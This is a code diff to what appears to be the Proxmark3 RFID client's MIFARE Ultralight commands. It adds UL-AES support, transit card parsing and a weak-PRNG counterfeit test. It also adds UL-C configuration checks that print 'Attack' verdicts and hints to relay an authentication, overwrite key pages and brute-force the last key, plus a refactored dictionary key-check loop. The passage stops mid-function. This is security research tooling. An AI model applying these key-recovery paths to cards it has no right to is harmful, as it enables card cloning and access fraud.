@@ -31,6 +31,7 @@
 #include "nfc/ndef.h"
 #include "cliparser.h"
 #include "cmdmain.h"
+#include "cmdhw.h"          // handle_tearoff
 #include "amiibo.h"         // amiiboo fcts
 #include "base64.h"
 #include "util_posix.h"     // msclock
@@ -40,6 +41,7 @@
 #include "crc16.h"
 #include "crypto/originality.h"
 #include "util.h"
+#include "parsers/parsetransit.h"   // transit card parsers
 #include <pthread.h>
 #include <vec/vec.h>
 
@@ -65,8 +67,20 @@
 #define MAX_ST25TN512       0x3F
 #define MAX_ST25TN01K       0x3F
 
+// UL-C key pages
+#define MFU_ULC_KEY0_PAGE   0x2C
+
+// UL-AES fixed memory map,  MF0AES(H)20
+#define MFU_AES_USER_FIRST  0x04
+#define MFU_AES_USER_LAST   0x27
+#define MFU_AES_LOCK_PAGE   0x28
+#define MFU_AES_CFG0_PAGE   0x29
+#define MFU_AES_CFG1_PAGE   0x2A
+#define MFU_AES_KEY0_PAGE   0x30
+
 #define MIFAREU3P_KEY_SIZE 16
 #define MIFAREULC_KEY_INDEX 3
+#define MFU_DEFAULT_KEY_DIC "mfulc_default_keys.dic"
 
 // The Capability Container sits in block 3, the NDEF data area starts at block 4
 // and READ takes a one byte block number, so block 255 is the last one reachable.
@@ -1179,8 +1193,80 @@ static int ulc_print_3deskey(uint8_t *data) {
     return PM3_SUCCESS;
 }
 
+static int ulaes_print_key(uint8_t *data) {
+    PrintAndLogEx(INFO, "    aeskey  [48/0x30]: %s [%s]", sprint_hex(data, 4), sprint_ascii(data, 4));
+    PrintAndLogEx(INFO, "    aeskey  [49/0x31]: %s [%s]", sprint_hex(data + 4, 4), sprint_ascii(data + 4, 4));
+    PrintAndLogEx(INFO, "    aeskey  [50/0x32]: %s [%s]", sprint_hex(data + 8, 4), sprint_ascii(data + 8, 4));
+    PrintAndLogEx(INFO, "    aeskey  [51/0x33]: %s [%s]", sprint_hex(data + 12, 4), sprint_ascii(data + 12, 4));
+    PrintAndLogEx(INFO, "aes key: " _GREEN_("%s"), sprint_hex_inrow(SwapEndian64(data, 16, 16), 16));
+    return PM3_SUCCESS;
+}
+
 // Only takes 16 bytes of data.  Now key data available here
-static int ulc_print_configuration(uint8_t *data) {
+// UL-C key page write protection, from the config pages 0x28..0x2B
+typedef enum {
+    ULC_CFG_UNKNOWN = 0,
+    ULC_CFG_LOCKED,     // lock byte 3 locks the key pages
+    ULC_CFG_RELAY,      // key pages writable after authentication
+    ULC_CFG_OPEN,       // key pages 0x2C..0x2E writable without authentication
+    ULC_CFG_READ_PROTECTED,
+} ulc_cfg_vuln_t;
+
+static ulc_cfg_vuln_t ulc_config_vuln(const uint8_t *data) {
+    // page 0x28 byte 1 (lock byte 3), bit 7 locks the key pages 0x2C..0x2F
+    if (data[1] & 0x80) {
+        return ULC_CFG_LOCKED;
+    }
+    // writes need authentication from page AUTH0 on
+    if (data[8] >= 0x2F) {
+        return ULC_CFG_OPEN;
+    }
+    return ULC_CFG_RELAY;
+}
+
+// eprint 2026/100 "BREAKMEIFYOUCAN!"
+static void ulc_print_vuln_hint(ulc_cfg_vuln_t v) {
+    switch (v) {
+        case ULC_CFG_RELAY:
+            PrintAndLogEx(HINT, "Hint: Key pages not locked. Relay a reader authentication, overwrite three key pages,");
+            PrintAndLogEx(HINT, "      then recover the fourth with " _YELLOW_("`hf mfu desbrute --reader`") " (eprint 2026/100)");
+            break;
+        case ULC_CFG_OPEN:
+            PrintAndLogEx(HINT, "Hint: Key pages writable without authentication. Overwrite three key pages,");
+            PrintAndLogEx(HINT, "      then recover the fourth with " _YELLOW_("`hf mfu desbrute --reader`") " (eprint 2026/100)");
+            break;
+        case ULC_CFG_UNKNOWN:
+        case ULC_CFG_LOCKED:
+        case ULC_CFG_READ_PROTECTED:
+        default:
+            break;
+    }
+}
+
+// green = exploitable, red = not
+static void ulc_print_config_verdict(ulc_cfg_vuln_t v) {
+    switch (v) {
+        case ULC_CFG_LOCKED:
+            PrintAndLogEx(SUCCESS, "ULC config... " _RED_("locked"));
+            break;
+        case ULC_CFG_RELAY:
+            PrintAndLogEx(SUCCESS, "ULC config... " _GREEN_("relay"));
+            PrintAndLogEx(SUCCESS, "Attack....... " _GREEN_("relayed auth 75%%"));
+            break;
+        case ULC_CFG_OPEN:
+            PrintAndLogEx(SUCCESS, "ULC config... " _GREEN_("unlocked"));
+            PrintAndLogEx(SUCCESS, "Attack....... " _GREEN_("partial key overwrite"));
+            break;
+        case ULC_CFG_READ_PROTECTED:
+            PrintAndLogEx(INFO, "ULC config... " _YELLOW_("read protected") ", can't assess the key page lock");
+            break;
+        case ULC_CFG_UNKNOWN:
+        default:
+            break;
+    }
+}
+
+static ulc_cfg_vuln_t ulc_print_configuration(const uint8_t *data) {
 
     PrintAndLogEx(NORMAL, "");
     PrintAndLogEx(INFO, "--- " _CYAN_("UL-C Configuration") " --------------------------");
@@ -1211,13 +1297,15 @@ static int ulc_print_configuration(uint8_t *data) {
                   (data[12] & 1) ? "write access restricted" : _RED_("R/W access restricted")
                  );
 
-    return PM3_SUCCESS;
+    return ulc_config_vuln(data);
 }
+
+static ulc_cfg_vuln_t mfu_print_dump_ulc_config(const mfu_dump_t *card, uint16_t block_cnt);
 
 static int ulaes_print_configuration(uint8_t *data, uint8_t start_page) {
 
     // first call
-    if (start_page == 0x2C) {
+    if (start_page == 0x29) {
         PrintAndLogEx(NORMAL, "");
         PrintAndLogEx(INFO, "--- " _CYAN_("UL-AES Configuration") " --------------------------");
 
@@ -1678,8 +1766,11 @@ static uint64_t ul_magic_test(void) {
     // check for GEN1A, GEN1B and NTAG21x
     PacketResponseNG resp;
     clearCommandBuffer();
-    uint8_t payload[] = { 0 };
-    SendCommandNG(CMD_HF_MIFARE_CIDENT, payload, sizeof(payload));
+    mf_chinese_ident_t payload = {
+        .is_mfc = false,
+        .keytype = MF_KEY_A,
+    };
+    SendCommandNG(CMD_HF_MIFARE_CIDENT, (uint8_t *)&payload, sizeof(payload));
 
     uint16_t is_generation = MAGIC_FLAG_NONE;
     if (WaitForResponseTimeout(CMD_HF_MIFARE_CIDENT, &resp, 1500)) {
@@ -1816,7 +1907,7 @@ typedef struct {
 } mfu_otp_identify_t;
 
 static mfu_otp_identify_t mfu_otp_ident_table[] = {
-    { "SALTO Systems card", 12, 4, "534C544F", ul_c_otpgenA, "report to iceman!" },
+    { "SALTO Systems card", 12, 4, "534C544F", ul_c_otpgenA, NULL },
     { NULL, 0, 0, NULL, NULL, NULL}   // must be the last item
 };
 
@@ -1918,13 +2009,13 @@ static mfu_identify_t mfu_ident_table[] = {
         "Philips Toothbrush", "0004040201010F03",
         16, 20, "0310D1010C55027068696C6970732E636F6DFE00",
         ul_ev1_pwdgen_def, ul_ev1_packgen_def,
-        "hf mfu pwdgen -r"
+        "hf mfu pwdgen"
     },
     {
         "Philips Toothbrush", "0004040201010F03",
         16, 36, "0320D1011C55027068696C6970732E636F6D2F6E6663627275736868656164746170FE00",
         ul_ev1_pwdgen_def, ul_ev1_packgen_def,
-        "hf mfu pwdgen -r"
+        "hf mfu pwdgen"
     },
     {
         "Bank Of Archie brothers", "0004030101000B03",
@@ -2003,6 +2094,81 @@ int mfu_get_version_uid(uint8_t *version, uint8_t *uid) {
     return PM3_SUCCESS;
 }
 
+// Weak-PRNG backstop: RndB collision => counterfeit LFSR
+#define MFULC_PRNG_SAMPLES 40
+#define MFULC_PRNG_CLEAR   39
+
+typedef enum {
+    MFULC_PRNG_NA = 0,          // could not collect nonces
+    MFULC_PRNG_WEAK,
+    MFULC_PRNG_GENUINE,
+    MFULC_PRNG_INCONCLUSIVE,
+} mfulc_prng_t;
+
+static mfulc_prng_t mfulc_prng_test(uint32_t samples, uint32_t *got_out, uint32_t *first_dup_out) {
+    if (samples < 2) {
+        samples = 2;
+    }
+    if (samples > 64) {
+        samples = 64;
+    }
+
+    uint8_t rndb[64][8];
+    uint32_t got = 0;
+
+    for (uint32_t i = 0; i < samples; i++) {
+        iso14a_card_select_t card;
+        if (ul_select(&card) == false) {
+            continue;
+        }
+        uint8_t nonce[11] = {0x00};
+        int rl = ulc_requestAuthentication(nonce, sizeof(nonce));
+        DropField();
+        // response is AF || ek(RndB)[8] || CRC[2]; compare the 8-byte ek(RndB)
+        if (rl < 9 || nonce[0] != 0xAF) {
+            continue;
+        }
+        memcpy(rndb[got], &nonce[1], 8);
+        got++;
+    }
+
+    *got_out = got;
+    *first_dup_out = 0;
+    if (got < 2) {
+        return MFULC_PRNG_NA;
+    }
+
+    uint32_t first_dup = 0;
+    uint32_t dups = 0;
+    for (uint32_t i = 0; i < got; i++) {
+        for (uint32_t j = 0; j < i; j++) {
+            if (memcmp(rndb[i], rndb[j], 8) == 0) {
+                if (first_dup == 0) {
+                    first_dup = i + 1; // 1-based draw index
+                }
+                dups++;
+                break;
+            }
+        }
+    }
+
+    if (dups > 0) {
+        *first_dup_out = first_dup;
+        return MFULC_PRNG_WEAK;
+    }
+    return (got >= MFULC_PRNG_CLEAR) ? MFULC_PRNG_GENUINE : MFULC_PRNG_INCONCLUSIVE;
+}
+
+// green = counterfeit / magic, exploitable
+static void mfulc_print_ic(const char *vendor, const char *ic, bool counterfeit) {
+    PrintAndLogEx(SUCCESS, "Vendor....... " _YELLOW_("%s"), vendor);
+    if (counterfeit) {
+        PrintAndLogEx(SUCCESS, "Chip IC...... " _GREEN_("%s"), ic);
+    } else {
+        PrintAndLogEx(SUCCESS, "Chip IC...... " _YELLOW_("%s"), ic);
+    }
+}
+
 static int mfulc_fingerprint(void) {
     iso14a_card_select_t card;
     PacketResponseNG resp;
@@ -2019,7 +2185,7 @@ static int mfulc_fingerprint(void) {
     uint16_t rlen_2017 = 0;
     if (WaitForIso14aReply(&resp, 500, &rlen_2017, NULL)) {
         if ((rlen_2017 == 11) && (resp.data.asBytes[0] == 0x00)) {
-            PrintAndLogEx(SUCCESS, _GREEN_("Lab401 Ultralight-C compatible UID modifiable"));
+            mfulc_print_ic("Lab401", "Ultralight-C compatible, UID modifiable", true);
             DropField();
             return PM3_SUCCESS;
         }
@@ -2037,7 +2203,7 @@ static int mfulc_fingerprint(void) {
     uint16_t rlen_2035 = 0;
     if (WaitForIso14aReply(&resp, 500, &rlen_2035, NULL)) {
         if ((rlen_2035 == 11) && (resp.data.asBytes[0] == 0xAF)) {
-            PrintAndLogEx(SUCCESS, _GREEN_("Feiju FJ8010"));
+            mfulc_print_ic("Feiju", "FJ8010", true);
             DropField();
             return PM3_SUCCESS;
         }
@@ -2061,11 +2227,12 @@ static int mfulc_fingerprint(void) {
             response[9] ^= resp.data.asBytes[9];
             response[10] ^= resp.data.asBytes[10];
             if ((response[9] == 0x6C) && (response[10] == 0xF3)) {
-                PrintAndLogEx(SUCCESS, _GREEN_("USCUID-UL with ULC authentication, variant 1"));
+                mfulc_print_ic("unknown", "USCUID-UL with ULC authentication, variant 1", true);
             } else if ((response[9] == 0xB4) && (response[10] == 0xC5)) {
-                PrintAndLogEx(SUCCESS, _GREEN_("USCUID-UL with ULC authentication, variant 2"));
+                mfulc_print_ic("unknown", "USCUID-UL with ULC authentication, variant 2", true);
             } else {
-                PrintAndLogEx(SUCCESS, _GREEN_("USCUID-UL with ULC authentication") _RED_(" unknown variant") ", please report!");
+                mfulc_print_ic("unknown", "USCUID-UL with ULC authentication", true);
+                PrintAndLogEx(INFO, "              " _RED_("unknown variant") ", please report!");
             }
             DropField();
             return PM3_SUCCESS;
@@ -2086,10 +2253,9 @@ static int mfulc_fingerprint(void) {
             uint16_t rlen_2084 = 0;
             if (WaitForIso14aReply(&resp, 500, &rlen_2084, NULL)) {
                 if (rlen_2084 == 18) {
-                    if ((resp.data.asBytes[0] == 0x04) && (resp.data.asBytes[6] == 0x15) && (resp.data.asBytes[7] == 0x89)) {
-                        PrintAndLogEx(SUCCESS, _GREEN_("GT23SC4489"));
-                    } else {
-                        PrintAndLogEx(SUCCESS, _GREEN_("GT23SC4489") _RED_(" unknown variant") ", please report!");
+                    mfulc_print_ic("Giantec", "GT23SC4489", true);
+                    if ((resp.data.asBytes[0] != 0x04) || (resp.data.asBytes[6] != 0x15) || (resp.data.asBytes[7] != 0x89)) {
+                        PrintAndLogEx(INFO, "              " _RED_("unknown variant") ", please report!");
                     }
                     DropField();
                     return PM3_SUCCESS;
@@ -2108,13 +2274,34 @@ static int mfulc_fingerprint(void) {
             cmd[1] = 3;
             status = ul_send_cmd_raw(cmd, sizeof(cmd), data, 4, false);
             if ((status > 0) && (data[0] == 0xE1) && (data[1] == 0x10) && (data[2] == 0x12) && (data[3] == 0x00)) {
-                PrintAndLogEx(INFO, "MIFARE Hospitality (MF0ICU2(H))");
+                mfulc_print_ic("NXP", "MF0ICU2(H), MIFARE Hospitality", false);
                 DropField();
                 return PM3_SUCCESS;
             }
         }
     }
-    PrintAndLogEx(INFO, "likely MF0ICU2");
+    // weak-PRNG backstop
+    uint32_t got = 0, first_dup = 0;
+    // green = weak / exploitable, red = genuine
+    switch (mfulc_prng_test(MFULC_PRNG_SAMPLES, &got, &first_dup)) {
+        case MFULC_PRNG_GENUINE:
+            PrintAndLogEx(SUCCESS, "PRNG......... " _RED_("genuine"));
+            mfulc_print_ic("NXP", "MF0ICU2", false);
+            break;
+        case MFULC_PRNG_WEAK:
+            PrintAndLogEx(SUCCESS, "PRNG......... " _GREEN_("weak") " ( RndB collision at nonce %u )", first_dup);
+            mfulc_print_ic("unknown", "counterfeit UL-C", true);
+            break;
+        case MFULC_PRNG_INCONCLUSIVE:
+            PrintAndLogEx(INFO, "PRNG......... " _YELLOW_("inconclusive") " ( %u / %u nonces )", got, (uint32_t)MFULC_PRNG_CLEAR);
+            mfulc_print_ic("likely NXP", "likely MF0ICU2", false);
+            break;
+        case MFULC_PRNG_NA:
+        default:
+            PrintAndLogEx(INFO, "PRNG......... n/a ( got %u nonces )", got);
+            mfulc_print_ic("unknown", "unknown", false);
+            break;
+    }
     DropField();
     return PM3_SUCCESS;
 }
@@ -2140,6 +2327,7 @@ static int mfu_fingerprint(uint64_t tagtype, bool has_auth_key, const uint8_t *a
     }
 
     maxbytes = ((maxbytes / MFU_BLOCK_SIZE) + 1) * MFU_BLOCK_SIZE;
+    maxbytes = MAX(maxbytes, TRANSIT_MFU_IDENTIFY_LEN);
     data = calloc(maxbytes, sizeof(uint8_t));
     if (data == NULL) {
         PrintAndLogEx(WARNING, "Failed to allocate memory");
@@ -2244,6 +2432,14 @@ static int mfu_fingerprint(uint64_t tagtype, bool has_auth_key, const uint8_t *a
                 PrintAndLogEx(HINT, "Hint: Use `" _YELLOW_("%s") "`", item->hint);
             }
         }
+    }
+
+    transit_idents_t transit_ids;
+    if (transit_mfu_identify(data, buffer_size, &transit_ids) > 0) {
+        transit_print_idents(&transit_ids);
+        (void)transit_mfu_parse(data, buffer_size);
+        transit_print_ident_hints(&transit_ids, NULL);
+        res = PM3_SUCCESS;
     }
 
 out:
@@ -2636,21 +2832,24 @@ static int CmdHF14AMfUInfo(const char *Cmd) {
 
         // read pages 0x28, 0x29, 0x2A, 0x2B
         uint8_t ulc_conf[16] = {0x00};
+        ulc_cfg_vuln_t ulc_vuln = ULC_CFG_UNKNOWN;
         status = ul_read(0x28, ulc_conf, sizeof(ulc_conf), false);
         if (status <= 0) {
             PrintAndLogEx(ERR, "Error: tag didn't answer to page 40 read command");
-            PrintAndLogEx(HINT, "Hint: Tag config may be set to read-protect those pages, try dumping");
+            PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu dump") "`");
             DropField();
             return PM3_ESOFT;
         }
 
         if (status == 16) {
-            ulc_print_configuration(ulc_conf);
+            ulc_vuln = ulc_print_configuration(ulc_conf);
         } else {
+            ulc_vuln = ULC_CFG_READ_PROTECTED;
             locked = true;
         }
 
         mfu_fingerprint(tagtype, has_auth_key, auth_key_ptr, ak_len, use_schann);
+        ulc_print_config_verdict(ulc_vuln);
 
         DropField();
 
@@ -2674,12 +2873,14 @@ static int CmdHF14AMfUInfo(const char *Cmd) {
                 ulc_print_3deskey(ulc_deskey);
             }
 
+            ulc_print_vuln_hint(ulc_vuln);
             PrintAndLogEx(NORMAL, "");
             return PM3_SUCCESS;
 
         } else {
             // if we called info with key, just return
             if (has_auth_key) {
+                ulc_print_vuln_hint(ulc_vuln);
                 PrintAndLogEx(NORMAL, "");
                 return PM3_SUCCESS;
             }
@@ -2694,6 +2895,7 @@ static int CmdHF14AMfUInfo(const char *Cmd) {
                 PrintAndLogEx(INFO, "n/a");
             }
 
+            ulc_print_vuln_hint(ulc_vuln);
             PrintAndLogEx(NORMAL, "");
             return PM3_SUCCESS;
         }
@@ -2798,10 +3000,14 @@ static int CmdHF14AMfUInfo(const char *Cmd) {
         uint8_t startconfigblock = 0;
         uint8_t ulev1_conf[16] = {0x00};
 
-        for (uint8_t i = 1; i < ARRAYLEN(UL_TYPES_ARRAY); i++) {
-            if ((tagtype & UL_TYPES_ARRAY[i]) == UL_TYPES_ARRAY[i]) {
-                startconfigblock = UL_MEMORY_ARRAY[i] - 3;
-                break;
+        // UL-AES config doesn't sit in the last four pages,  those are the AES keys.
+        // Its config pages are read further down
+        if ((tagtype & MFU_TT_UL_AES) != MFU_TT_UL_AES) {
+            for (uint8_t i = 1; i < ARRAYLEN(UL_TYPES_ARRAY); i++) {
+                if ((tagtype & UL_TYPES_ARRAY[i]) == UL_TYPES_ARRAY[i]) {
+                    startconfigblock = UL_MEMORY_ARRAY[i] - 3;
+                    break;
+                }
             }
         }
 
@@ -2948,11 +3154,11 @@ static int CmdHF14AMfUInfo(const char *Cmd) {
             }
             if (len < 1) {
                 PrintAndLogEx(WARNING, _YELLOW_("password not known"));
-                PrintAndLogEx(HINT, "Hint: Try " _YELLOW_("`hf mfu pwdgen -r`") " to get see known pwd gen algo suggestions");
+                PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu pwdgen") "` for suggestions");
             }
         } else {
             if (locked) {
-                PrintAndLogEx(HINT, "Hint: Try " _YELLOW_("`hf mfu pwdgen -r`") " to get see known pwd gen algo suggestions");
+                PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu pwdgen") "` for suggestions");
             }
         }
     }
@@ -2964,11 +3170,11 @@ out:
 
     if (locked) {
         PrintAndLogEx(INFO, "\nTag appears to be locked, try using a key to get more info");
-        PrintAndLogEx(HINT, "Hint: Try " _YELLOW_("`hf mfu pwdgen -r`") " to get see known pwd gen algo suggestions");
+        PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu pwdgen") "` for suggestions");
     }
 
     if (tagtype & (MFU_TT_MAGIC_1A | MFU_TT_MAGIC_1B | MFU_TT_MAGIC_2)) {
-        PrintAndLogEx(HINT, "Hint: Try " _YELLOW_("`script run hf_mfu_setuid -h`") " to set UID");
+        PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("script run hf_mfu_setuid -h") "` to set UID");
     }
 
     PrintAndLogEx(NORMAL, "");
@@ -3543,6 +3749,7 @@ static int CmdHF14AMfUDump(const char *Cmd) {
         arg_lit0(NULL, "ns", "no save to file"),
         arg_lit0("z", "dense", "dense dump output style"),
         arg_lit0(NULL, "schann", "use secure channel. Must have key"),
+        arg_lit0("v", "verbose", "verbose output, decode the UL-C config"),
         arg_param_end
     };
     CLIExecWithReturn(ctx, Cmd, argtable, true);
@@ -3561,6 +3768,7 @@ static int CmdHF14AMfUDump(const char *Cmd) {
     bool nosave = arg_get_lit(ctx, 6);
     bool dense_output = (g_session.dense_output || arg_get_lit(ctx, 7));
     bool use_schann = arg_get_lit(ctx, 8);
+    bool verbose = arg_get_lit(ctx, 9);
     CLIParserFree(ctx);
 
     bool has_auth_key = false;
@@ -3840,8 +4048,18 @@ static int CmdHF14AMfUDump(const char *Cmd) {
         PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu ndefread")"`");
     }
 
+    if (start_page == 0) {
+        (void)transit_mfu_parse(dump_file_data.data, pages * MFU_BLOCK_SIZE);
+    }
+
+    ulc_cfg_vuln_t ulc_vuln = ULC_CFG_UNKNOWN;
+    if (verbose && (start_page == 0)) {
+        ulc_vuln = mfu_print_dump_ulc_config(&dump_file_data, pages);
+    }
+
     if (nosave) {
         PrintAndLogEx(INFO, "Called with no save option");
+        ulc_print_vuln_hint(ulc_vuln);
         PrintAndLogEx(NORMAL, "");
         return PM3_SUCCESS;
     }
@@ -3863,6 +4081,7 @@ static int CmdHF14AMfUDump(const char *Cmd) {
         PrintAndLogEx(WARNING, "Partial dump created. (%d of %d blocks)", pages, card_mem_size);
     }
 
+    ulc_print_vuln_hint(ulc_vuln);
     return PM3_SUCCESS;
 }
 
@@ -4035,6 +4254,7 @@ static int CmdHF14AMfURestore(const char *Cmd) {
                   "hf mfu restore -f myfile -s                 -> special write\n"
                   "hf mfu restore -f myfile -k AABBCCDD -s     -> special write, use key\n"
                   "hf mfu restore -f myfile -k AABBCCDD -ser   -> special write, use key, write dump pwd, ...\n"
+                  "hf mfu restore -f myfile -k 00112233445566778899AABBCCDDEEFF -> UL-C / UL-AES, use key\n"
                   "\n"
                   "Note: Restoring a NTAG/UL dump to a UMC will likely result in incorrect PWD and PACK\n"
                  );
@@ -4042,7 +4262,7 @@ static int CmdHF14AMfURestore(const char *Cmd) {
     void *argtable[] = {
         arg_param_begin,
         arg_str1("f", "file", "<fn>", "Specify a filename for dump file"),
-        arg_str0("k", "key", "<hex>", "key for authentication (UL-C 16 bytes, EV1/NTAG 4 bytes)"),
+        arg_str0("k", "key", "<hex>", "key for authentication (UL-C/UL-AES 16 bytes, EV1/NTAG 4 bytes)"),
         arg_lit0("l", NULL, "swap entered key's endianness"),
         arg_lit0("s", NULL, "enable special write UID -MAGIC TAG ONLY-"),
         arg_lit0("e", NULL, "enable special write version/signature -MAGIC NTAG 21* ONLY-"),
@@ -4134,6 +4354,8 @@ static int CmdHF14AMfURestore(const char *Cmd) {
         return PM3_ESOFT;
     }
 
+    bool is_ulaes = ((tagtype & MFU_TT_UL_AES) == MFU_TT_UL_AES);
+
     if ((tagtype & MFU_TT_UL_C) == MFU_TT_UL_C) {
         if ((has_key == true) && (ak_len != 16)) {
             PrintAndLogEx(ERR, "UL-C key must be 16 bytes");
@@ -4162,12 +4384,6 @@ static int CmdHF14AMfURestore(const char *Cmd) {
             free(dump);
             return PM3_EINVARG;
         }
-    }
-
-    if ((tagtype & MFU_TT_UL_AES) == MFU_TT_UL_AES) {
-        PrintAndLogEx(ERR, "Sorry, UL-AES not yet supported.  Feel free to implement!");
-        free(dump);
-        return PM3_ENOTIMPL;
     }
 
     PrintAndLogEx(INFO, "Restoring " _YELLOW_("%s")" to card", filename);
@@ -4271,7 +4487,19 @@ static int CmdHF14AMfURestore(const char *Cmd) {
     // write all other data
     // Skip block 0,1,2,3 (only magic tags can write to them)
     // Skip last 5 blocks usually is configuration
-    for (uint8_t b = 4; b < pages - 5; b++) {
+    uint8_t first_page = 4;
+    uint8_t last_page = pages - 5;
+
+    if (is_ulaes) {
+        // UL-AES user memory stops before the lock, config and key pages
+        first_page = MFU_AES_USER_FIRST;
+        last_page = MFU_AES_USER_LAST + 1;
+        if (pages < last_page) {
+            last_page = pages;
+        }
+    }
+
+    for (uint8_t b = first_page; b < last_page; b++) {
 
         //Send write Block
         memcpy(packetw.data, mem->data + (b * 4), 4);
@@ -4298,8 +4526,19 @@ static int CmdHF14AMfURestore(const char *Cmd) {
         // otp, uid, lock, dynlockbits, cfg0, cfg1
         uint8_t blocks[] = {3, 0, 1, 2, pages - 5, pages - 4, pages - 3};
 #endif
-        for (uint8_t i = 0; i < ARRAYLEN(blocks); i++) {
-            uint8_t b = blocks[i];
+        // otp, uid, lock, cfg0, cfg1.
+        // RFU pages (0x2B, 0x2C) and the key lock bits (0x2D) are left alone, they are one way
+        uint8_t ulaes_blocks[] = {3, 0, 1, 2, MFU_AES_LOCK_PAGE, MFU_AES_CFG0_PAGE, MFU_AES_CFG1_PAGE};
+
+        uint8_t *pblocks = blocks;
+        uint8_t blockcnt = ARRAYLEN(blocks);
+        if (is_ulaes) {
+            pblocks = ulaes_blocks;
+            blockcnt = ARRAYLEN(ulaes_blocks);
+        }
+
+        for (uint8_t i = 0; i < blockcnt; i++) {
+            uint8_t b = pblocks[i];
             memcpy(packetw.data, mem->data + (b * 4), 4);
             packetw.block_no = b;
             clearCommandBuffer();
@@ -4311,6 +4550,12 @@ static int CmdHF14AMfURestore(const char *Cmd) {
 
     DropField();
     free(dump);
+
+    if (is_ulaes) {
+        PrintAndLogEx(INFO, "Key pages 0x%02X..0x%02X not restored", MFU_AES_KEY0_PAGE, MAX_UL_AES);
+        PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu setkey -k <16 hex bytes>") "` to restore the AES keys");
+    }
+
     PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu dump --ns") "` to verify");
     PrintAndLogEx(INFO, "Done!");
     return PM3_SUCCESS;
@@ -4346,8 +4591,11 @@ static int CmdHF14AMfUeLoad(const char *Cmd) {
     snprintf(nc, nc_len, "%s --ul", Cmd);
     int res = CmdHF14AMfELoad(nc);
     free(nc);
+    if (res != PM3_SUCCESS) {
+        return res;
+    }
 
-    PrintAndLogEx(HINT, "Hint: Try " _YELLOW_("`hf mfu sim -t 7`") " to simulate an Amiibo.");
+    PrintAndLogEx(HINT, "Hint: Use `" _YELLOW_("hf mfu sim -t 7") "` to simulate an Amiibo.");
     PrintAndLogEx(INFO, "Done!");
     return res;
 }
@@ -4718,57 +4966,12 @@ static int CmdHF14AMfUCAuth(const char *Cmd) {
     return isok;
 }
 
-static int CmdHF14AMfUCAuthChk(const char *Cmd) {
-    CLIParserContext *ctx;
-    CLIParserInit(&ctx, "hf mfu cchk",
-                  "It checks MIFARE Ultralight C tags keys against a dictionary file with keys\n",
-                  "hf mfu cchk -f mfulc_default_keys.dic");
-
-    void *argtable[] = {
-        arg_param_begin,
-        arg_str0("f", "file", "<fn>", "filename of dictionary"),
-        arg_int0("s", "segment", "<0..3>", "Segment index (full key if not specified)"),
-        arg_int0("r", "retries", "<0..255>", "Number of retries (def: 0)"),
-        arg_str0("k", "key", "<hex>", "Starting key, 16 hex bytes (def: zero key), for segment check"),
-        arg_lit0("x", "xor", "XOR starting key with segment candidates (def: override)"),
-        arg_lit0("n", "nocheck", "Skip checking tag answer correctness"),
-        arg_lit0("0", "read0", "Use fast READ0 (skip anticol)"),
-        arg_param_end
-    };
-    CLIExecWithReturn(ctx, Cmd, argtable, true);
-
-    int fnlen = 0;
-    char filename[FILE_PATH_SIZE] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
-    int segment = arg_get_int_def(ctx, 2, -1);   // -1 means full key
-    int retries = arg_get_int_def(ctx, 3, 0);
-    int ref_keylen = 0;
-    uint8_t ref_key[16] = {0};
-    CLIGetHexWithReturn(ctx, 4, ref_key, &ref_keylen);
-    bool xor_ref_key = arg_get_lit(ctx, 5);
-    bool check_answer = !arg_get_lit(ctx, 6);
-    bool use_fastread0 = arg_get_lit(ctx, 7);
-    CLIParserFree(ctx);
-
-    if (fnlen == 0) {
-        PrintAndLogEx(ERR, "No dictionary file specified");
-        return PM3_EFILE;
-    }
-    if (segment < -1 || segment > 3) {
-        PrintAndLogEx(ERR, "Invalid segment (must be 0..3)");
-        return PM3_EINVARG;
-    }
-    if (retries < 0 || retries > 255) {
-        PrintAndLogEx(ERR, "Invalid retries (must be 0..255)");
-        return PM3_EINVARG;
-    }
-    if (ref_keylen && ref_keylen != MIFAREU3P_KEY_SIZE) {
-        PrintAndLogEx(WARNING, "Key must be %i hex bytes. Got %d", MIFAREU3P_KEY_SIZE, ref_keylen);
-        return PM3_EINVARG;
-    }
-    if (ref_keylen == 0) {
-        ref_keylen = MIFAREU3P_KEY_SIZE;
-    }
+// Runs one dictionary against one key slot.  The device can only hold a few keys
+// per frame, so the dictionary is fed to it in chunks: the first chunk selects the
+// card, the last one drops the field.
+static int mfu_auth_chk(uint8_t key_index, const char *filename, int fnlen, int segment,
+                        int retries, uint8_t *ref_key, bool xor_ref_key, bool check_answer,
+                        bool use_fastread0) {
 
     uint8_t *keyBlock = NULL;
     uint32_t keycnt = 0;
@@ -4789,9 +4992,6 @@ static int CmdHF14AMfUCAuthChk(const char *Cmd) {
         max_chunk = MIFAREU3P_CHKKEY_MAX_KEYS;
     }
     uint32_t chunksize = (keycnt > max_chunk) ? max_chunk : keycnt;
-    bool firstChunk = true, lastChunk = false;
-
-    int i = 0;
 
     // time
     uint32_t auths = 0;
@@ -4799,7 +4999,12 @@ static int CmdHF14AMfUCAuthChk(const char *Cmd) {
 
     // main keychunk loop
     for (int r = 0; r < retries + 1; r++) {
-        for (i = 0; i < keycnt; i += chunksize) {
+
+        // every pass needs its own select and its own teardown
+        bool firstChunk = true, lastChunk = false;
+
+        for (uint32_t i = 0; i < keycnt; i += chunksize) {
+
             if (kbd_enter_pressed()) {
                 clearCommandBuffer();
                 SendCommandNG(CMD_BREAK_LOOP, NULL, 0);
@@ -4809,33 +5014,143 @@ static int CmdHF14AMfUCAuthChk(const char *Cmd) {
                 goto out;
             }
 
-            uint32_t nkeys = ((keycnt - i)  > chunksize) ? chunksize : keycnt - i;
+            uint32_t nkeys = ((keycnt - i) > chunksize) ? chunksize : keycnt - i;
 
             // last chunk?
             if (nkeys == keycnt - i) {
                 lastChunk = true;
             }
-            int res = mfu_3pass_check_keys(MIFAREULC_KEY_INDEX, firstChunk, lastChunk, nkeys, segment, ref_key, xor_ref_key, keyBlock + (i * keysize), false, true, &auths, &ms, check_answer, use_fastread0);
-            if (firstChunk)
-                firstChunk = false;
 
